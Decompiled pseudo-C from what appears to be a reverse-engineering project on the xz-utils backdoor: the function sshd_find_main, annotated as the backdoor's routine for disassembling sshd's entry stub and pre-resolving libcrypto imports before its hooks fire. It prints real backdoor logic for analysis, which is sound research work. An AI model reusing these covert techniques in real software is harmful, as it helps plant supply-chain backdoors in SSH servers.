// /home/kali/xzre-ghidra/xzregh/102550_sshd_find_main.c
// Function: sshd_find_main @ 0x102550
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_main(u8 * * code_start_out, elf_info_t * sshd, elf_info_t * libcrypto, imported_funcs_t * imported_funcs)
/*
 * AutoDoc: Scans sshd's entry-point stub to locate the real sshd_main function and prefetch key libcrypto imports. The backdoor needs that entry address as the anchor for later monitor-structure searches and to seed its imported_funcs table before hooks fire.
 */

#include "xzre_types.h"


BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
                   imported_funcs_t *imported_funcs)

{
  Elf64_Addr EVar1;
  Elf64_Ehdr *pEVar2;
  BOOL BVar3;
  lzma_allocator *allocator;
  u8 *puVar4;
  _func_40 *p_Var5;
  u8 *puVar6;
  Elf64_Sym *pEVar7;
  u8 *puVar8;
  long lVar9;
  u8 **ppuVar10;
  uchar *code_start;
  u8 *code_end;
  u8 *puVar11;
  u8 *puVar12;
  byte bVar13;
  u64 local_88;
  u8 *local_80;
  u64 local_78;
  undefined1 local_6f;
  undefined1 local_65;
  undefined4 local_64;
  int local_58;
  long local_50;
  
  bVar13 = 0;
  local_88 = 0;
  allocator = get_lzma_allocator();
  allocator->opaque = libcrypto;
  puVar4 = (u8 *)elf_get_code_segment(sshd,&local_88);
  if (puVar4 != (u8 *)0x0) {
    puVar12 = puVar4 + local_88;
    p_Var5 = (_func_40 *)lzma_alloc(0x758,allocator);
    imported_funcs->EVP_PKEY_new_raw_public_key = p_Var5;
    if (p_Var5 != (_func_40 *)0x0) {
      imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
    }
    puVar6 = (u8 *)elf_get_got_symbol(sshd,STR_libc_start_main);
    if (((puVar6 != (u8 *)0x0) &&
        (code_start = sshd->elfbase->e_ident + sshd->elfbase->e_entry, code_start < puVar12)) &&
       (puVar4 <= code_start)) {
      ppuVar10 = &local_80;
      lVar9 = 0x16;
      code_end = code_start + 0x200;
      if (puVar12 <= code_start + 0x200) {
        code_end = puVar12;
      }
      for (; lVar9 != 0; lVar9 = lVar9 + -1) {
        *(undefined4 *)ppuVar10 = 0;
        ppuVar10 = (u8 **)((long)ppuVar10 + (ulong)bVar13 * -8 + 4);
      }
      pEVar7 = elf_symbol_get(libcrypto,STR_EVP_Digest,0);
      if (pEVar7 != (Elf64_Sym *)0x0) {
        EVar1 = pEVar7->st_value;
        pEVar2 = libcrypto->elfbase;
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        imported_funcs->EVP_Digest = (_func_56 *)(pEVar2->e_ident + EVar1);
      }
      puVar11 = (u8 *)0x0;
      while (code_start < code_end) {
        BVar3 = x86_dasm((dasm_ctx_t *)&local_80,code_start,code_end);
        if (BVar3 == 0) {
          code_start = code_start + 1;
        }
        else {
          if (local_58 == 0x10d) {
            if (((((local_65 & 0x48) == 0x48) && ((uint)local_64 >> 8 == 0x50700)) &&
                (puVar8 = local_80 + local_50 + local_78, puVar4 <= puVar8)) && (puVar8 < puVar12))
            {
              puVar11 = puVar8;
            }
          }
          else if (((puVar11 != (u8 *)0x0) && (local_58 == 0x17f)) &&
                  (((uint)local_64 >> 8 == 0x50200 &&
                   (((local_6f & 1) != 0 && (puVar6 == local_80 + local_78 + local_50)))))) {
            pEVar7 = elf_symbol_get(libcrypto,STR_EVP_sha256,0);
            if (pEVar7 != (Elf64_Sym *)0x0) {
              imported_funcs->EVP_sha256 =
                   (_func_38 *)(libcrypto->elfbase->e_ident + pEVar7->st_value);
              imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
            }
            *code_start_out = puVar11;
            return 1;
          }
          code_start = code_start + local_78;
        }
      }
    }
    lzma_free(imported_funcs->EVP_PKEY_new_raw_public_key,allocator);
  }
  return 0;
}

